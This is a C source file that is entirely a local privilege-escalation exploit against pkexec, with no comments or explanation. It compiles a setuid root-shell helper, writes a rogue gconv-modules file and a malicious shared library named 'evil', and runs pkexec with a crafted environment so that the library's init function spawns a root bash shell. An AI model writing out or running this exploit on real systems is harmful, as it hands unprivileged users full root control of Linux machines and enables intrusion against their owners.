#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *shell = "#include <stdio.h>\nint main(){setuid(0);setgid(0);system(\"/bin/bash\");}";
char *filename = "sh.c";

int main() {
    FILE *f = fopen(filename, "w");
    fprintf(f, "%s", shell);
    fclose(f);
    system("gcc sh.c -o sh");
    remove("sh.c");

    char *args[] = { "pkexec", NULL };
    char *envp[] = {
        "PATH=GCONV_PATH=.",
        "SHELL=evil",
        "CHARSET=evil",
        "GIO_USE_VFS=",
        NULL
    };

    mkdir("GCONV_PATH=.", 0755);
    FILE *gconv = fopen("GCONV_PATH=./gconv-modules", "w");
    fprintf(gconv, "module  evil//    INTERNAL    evil    2\n");
    fclose(gconv);

    mkdir("evil", 0755);
    FILE *evil = fopen("evil/evil.c", "w");
    fprintf(evil, "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid gconv() {}\nvoid gconv_init() { setuid(0); setgid(0); system(\"./sh\"); exit(0); }");
    fclose(evil);
    system("gcc -shared -fPIC evil/evil.c -o evil/evil.so");

    execve("/usr/bin/pkexec", args, envp);
    return 0;
}
